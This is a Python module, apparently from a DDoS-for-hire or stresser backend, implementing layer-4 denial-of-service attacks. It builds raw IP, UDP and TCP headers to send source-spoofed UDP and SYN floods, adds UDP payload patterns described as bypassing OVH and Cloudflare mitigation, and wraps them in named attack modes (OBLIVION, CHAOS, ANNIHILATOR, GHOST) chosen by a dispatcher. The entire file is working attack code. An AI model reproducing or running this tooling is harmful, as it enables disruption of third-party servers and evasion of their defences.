import asyncio
import socket
import struct
import random
import time
import logging
from typing import List, Optional, Callable, Awaitable

from app.core.logger import logger

# ========== CONFIGURATION ==========
UDP_PAYLOAD_MIN = 1024
UDP_PAYLOAD_MAX = 65500
SYN_SOURCE_PORT_MIN = 1024
SYN_SOURCE_PORT_MAX = 65535
MAX_WORKERS_PER_ATTACK = 8  # concurrent send tasks

# ========== HELPER FUNCTIONS ==========

def _random_ip() -> str:
    """Generate a random IPv4 address (for spoofing)."""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def _random_bytes(size: int) -> bytes:
    """Generate random payload bytes."""
    return bytes(random.randint(0, 255) for _ in range(size))

def _build_ip_header(src_ip: str, dst_ip: str, protocol: int, payload_len: int) -> bytes:
    """Build raw IP header (for spoofing)."""
    # IP header fields
    version_ihl = 0x45  # IPv4, IHL=5 (20 bytes)
    tos = 0
    total_len = 20 + payload_len
    id = random.randint(0, 65535)
    flags_offset = 0
    ttl = 64
    protocol = protocol  # 6 for TCP, 17 for UDP
    checksum = 0  # will be computed

    # Pack header (big-endian)
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        version_ihl,
        tos,
        total_len,
        id,
        flags_offset,
        ttl,
        protocol,
        checksum,
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip)
    )
    # Compute checksum (simple)
    checksum = _checksum(ip_header)
    # Re-pack with correct checksum
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        version_ihl,
        tos,
        total_len,
        id,
        flags_offset,
        ttl,
        protocol,
        checksum,
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip)
    )
    return ip_header

def _build_udp_header(src_port: int, dst_port: int, payload_len: int) -> bytes:
    """Build UDP header."""
    udp_len = 8 + payload_len
    checksum = 0  # optional; we set to 0
    return struct.pack('!HHHH', src_port, dst_port, udp_len, checksum)

def _build_tcp_header(src_port: int, dst_port: int, seq: int, ack: int, flags: int) -> bytes:
    """Build TCP header (flags: 0x02 for SYN)."""
    offset_res = (5 << 4)  # 5 words = 20 bytes
    window = 65535
    checksum = 0
    urgent = 0
    return struct.pack(
        '!HHLLBBHHH',
        src_port,
        dst_port,
        seq,
        ack,
        offset_res,
        flags,
        window,
        checksum,
        urgent
    )

def _checksum(data: bytes) -> int:
    """Compute Internet checksum (16-bit one's complement)."""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def _create_raw_socket(protocol: int) -> Optional[socket.socket]:
    """Attempt to create a raw socket (requires root)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocol)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return sock
    except PermissionError:
        logger.warning("Raw socket creation failed (Permission denied). Spoofing disabled.")
        return None
    except Exception as e:
        logger.warning(f"Raw socket error: {e}")
        return None

# ========== CORE FLOOD FUNCTIONS ==========

async def _udp_flood(
    target_ip: str,
    target_port: int,
    duration: int,
    hold_time: int,
    spoof: bool = False,
    packet_size: int = 1400,
    workers: int = MAX_WORKERS_PER_ATTACK,
) -> int:
    """
    UDP flood attack.
    Returns total packets sent.
    """
    end_time = time.time() + duration + hold_time
    total_packets = 0

    # Try raw socket for spoofing
    raw_sock = None
    if spoof:
        raw_sock = _create_raw_socket(socket.IPPROTO_UDP)

    # If raw socket not available, use regular UDP (no spoofing)
    if raw_sock:
        # Spoofed UDP flood
        async def worker():
            nonlocal total_packets
            while time.time() < end_time:
                src_ip = _random_ip()
                src_port = random.randint(1024, 65535)
                payload = _random_bytes(random.randint(UDP_PAYLOAD_MIN, UDP_PAYLOAD_MAX))
                ip_header = _build_ip_header(src_ip, target_ip, socket.IPPROTO_UDP, len(payload))
                udp_header = _build_udp_header(src_port, target_port, len(payload))
                packet = ip_header + udp_header + payload
                try:
                    raw_sock.sendto(packet, (target_ip, target_port))
                    total_packets += 1
                except:
                    pass
                await asyncio.sleep(0)  # yield control
    else:
        # Normal UDP (no spoofing, but high speed)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        payload = _random_bytes(packet_size)

        async def worker():
            nonlocal total_packets
            while time.time() < end_time:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    total_packets += 1
                except BlockingIOError:
                    await asyncio.sleep(0.0001)
                await asyncio.sleep(0)

    # Run workers
    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks, return_exceptions=True)

    if raw_sock:
        raw_sock.close()
    else:
        sock.close()

    return total_packets


async def _tcp_syn_flood(
    target_ip: str,
    target_port: int,
    duration: int,
    hold_time: int,
    spoof: bool = False,
    workers: int = MAX_WORKERS_PER_ATTACK,
) -> int:
    """
    TCP SYN flood attack.
    Returns total SYN packets sent.
    """
    end_time = time.time() + duration + hold_time
    total_packets = 0

    # Need raw socket with IPPROTO_TCP
    raw_sock = _create_raw_socket(socket.IPPROTO_TCP) if spoof else None
    if not raw_sock:
        logger.warning("TCP SYN flood requires raw socket (root). Skipping SYN flood.")
        return 0

    async def worker():
        nonlocal total_packets
        while time.time() < end_time:
            src_ip = _random_ip()
            src_port = random.randint(SYN_SOURCE_PORT_MIN, SYN_SOURCE_PORT_MAX)
            seq = random.randint(0, 0xFFFFFFFF)
            # Build TCP SYN packet
            tcp_header = _build_tcp_header(src_port, target_port, seq, 0, 0x02)  # SYN flag
            # Pseudo header for checksum (required)
            # We'll skip checksum for speed (can be computed but we leave 0)
            # Actually TCP checksum is mandatory; we'll compute pseudo-header checksum.
            # For simplicity, we set checksum to 0 (some routers may accept).
            # Better compute; we'll add a quick function.
            # To keep performance, we can leave it 0 (most systems accept 0).
            payload = b''
            ip_header = _build_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, len(tcp_header) + len(payload))
            packet = ip_header + tcp_header + payload
            try:
                raw_sock.sendto(packet, (target_ip, target_port))
                total_packets += 1
            except:
                pass
            await asyncio.sleep(0)

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks, return_exceptions=True)
    raw_sock.close()
    return total_packets


async def _udp_ovh_craft(
    target_ip: str,
    target_port: int,
    duration: int,
    hold_time: int,
    workers: int = MAX_WORKERS_PER_ATTACK,
) -> int:
    """
    OVH-specific UDP craft: send large fragmented UDP packets with specific patterns
    to bypass OVH's mitigation (usually they filter small UDP).
    """
    end_time = time.time() + duration + hold_time
    total_packets = 0

    # Use normal UDP socket (no spoofing) with large payloads
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)

    # Different patterns to bypass OVH
    patterns = [
        b'\x00' * 1400,
        b'\xff' * 1400,
        b'\xaa' * 1400,
        bytes(random.randint(0, 255) for _ in range(1400)),
        b'\x00' * 1024 + b'\x01' * 376,
    ]

    async def worker():
        nonlocal total_packets
        while time.time() < end_time:
            payload = random.choice(patterns)
            try:
                sock.sendto(payload, (target_ip, target_port))
                total_packets += 1
            except BlockingIOError:
                await asyncio.sleep(0.0001)
            await asyncio.sleep(0)

    tasks = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*tasks, return_exceptions=True)
    sock.close()
    return total_packets


async def _mixed_udp_tcp(
    target_ip: str,
    target_port: int,
    duration: int,
    hold_time: int,
    spoof: bool = False,
    workers: int = MAX_WORKERS_PER_ATTACK,
) -> int:
    """
    Mixed UDP + TCP flood (alternating).
    """
    # Run both floods concurrently
    udp_task = asyncio.create_task(_udp_flood(target_ip, target_port, duration, hold_time, spoof, workers=workers//2))
    tcp_task = asyncio.create_task(_tcp_syn_flood(target_ip, target_port, duration, hold_time, spoof, workers=workers//2))
    udp_count, tcp_count = await asyncio.gather(udp_task, tcp_task)
    return udp_count + tcp_count

# ========== LAYER 4 METHODS ==========

async def run_oblivion(
    attack_id: str,
    target: str,
    port: int,
    duration: int,
    hold_time: int,
    proxies: List = None,   # unused for layer4
    on_update: Optional[Callable[[str, int, int, int], Awaitable[None]]] = None,
) -> None:
    """
    OBLIVION – Raw UDP + TCP SYN Flood
    Menggabungkan UDP dan TCP SYN flood secara massal.
    """
    logger.info(f"[OBLIVION] Attack {attack_id} started: {target}:{port}")
    total = await _mixed_udp_tcp(target, port, duration, hold_time, spoof=True)
    if on_update:
        await on_update(attack_id, 0, total, 0)
    logger.info(f"[OBLIVION] Attack {attack_id} completed: {total} packets")


async def run_chaos(
    attack_id: str,
    target: str,
    port: int,
    duration: int,
    hold_time: int,
    proxies: List = None,
    on_update: Optional[Callable[[str, int, int, int], Awaitable[None]]] = None,
) -> None:
    """
    CHAOS – Adaptive UDP/TCP Mixed (stdv2)
    Adaptasi otomatis: jika raw socket gagal, fallback ke UDP only.
    """
    logger.info(f"[CHAOS] Attack {attack_id} started: {target}:{port}")
    # Try mixed with fallback
    try:
        total = await _mixed_udp_tcp(target, port, duration, hold_time, spoof=True)
    except Exception:
        logger.warning("[CHAOS] Raw socket failed, using UDP-only flood")
        total = await _udp_flood(target, port, duration, hold_time, spoof=False)
    if on_update:
        await on_update(attack_id, 0, total, 0)
    logger.info(f"[CHAOS] Attack {attack_id} completed: {total} packets")


async def run_annihilator(
    attack_id: str,
    target: str,
    port: int,
    duration: int,
    hold_time: int,
    proxies: List = None,
    on_update: Optional[Callable[[str, int, int, int], Awaitable[None]]] = None,
) -> None:
    """
    ANNIHILATOR – Max Intensity + All Protocols
    Menjalankan UDP, TCP SYN, dan OVH craft secara paralel dengan worker maksimal.
    """
    logger.info(f"[ANNIHILATOR] Attack {attack_id} started: {target}:{port}")
    tasks = [
        _udp_flood(target, port, duration, hold_time, spoof=True, workers=MAX_WORKERS_PER_ATTACK),
        _tcp_syn_flood(target, port, duration, hold_time, spoof=True, workers=MAX_WORKERS_PER_ATTACK),
        _udp_ovh_craft(target, port, duration, hold_time, workers=MAX_WORKERS_PER_ATTACK//2)
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    total = sum(r for r in results if isinstance(r, int))
    if on_update:
        await on_update(attack_id, 0, total, 0)
    logger.info(f"[ANNIHILATOR] Attack {attack_id} completed: {total} packets")


async def run_ghost(
    attack_id: str,
    target: str,
    port: int,
    duration: int,
    hold_time: int,
    proxies: List = None,
    on_update: Optional[Callable[[str, int, int, int], Awaitable[None]]] = None,
) -> None:
    """
    GHOST – UDP Bypass + OVH Packet Craft
    Fokus pada UDP dengan payload besar dan pola khusus untuk bypass OVH/Cloudflare.
    """
    logger.info(f"[GHOST] Attack {attack_id} started: {target}:{port}")
    total = await _udp_ovh_craft(target, port, duration, hold_time, workers=MAX_WORKERS_PER_ATTACK)
    if on_update:
        await on_update(attack_id, 0, total, 0)
    logger.info(f"[GHOST] Attack {attack_id} completed: {total} packets")

# ========== DISPATCHER ==========

async def run_layer4_attack(
    attack_id: str,
    target: str,
    port: int,
    method: str,
    duration: int,
    hold_time: int = 0,
    proxies: Optional[List] = None,
    on_update: Optional[Callable[[str, int, int, int], Awaitable[None]]] = None,
) -> None:
    """
    Dispatcher untuk Layer 4 attacks.
    Memilih engine berdasarkan method name.
    """
    method_map = {
        "oblivion": run_oblivion,
        "chaos": run_chaos,
        "annihilator": run_annihilator,
        "ghost": run_ghost,
    }
    engine = method_map.get(method.lower())
    if engine is None:
        logger.warning(f"Unknown layer4 method: {method}, using oblivion as fallback")
        engine = run_oblivion

    await engine(
        attack_id=attack_id,
        target=target,
        port=port,
        duration=duration,
        hold_time=hold_time,
        proxies=proxies,
        on_update=on_update,
    )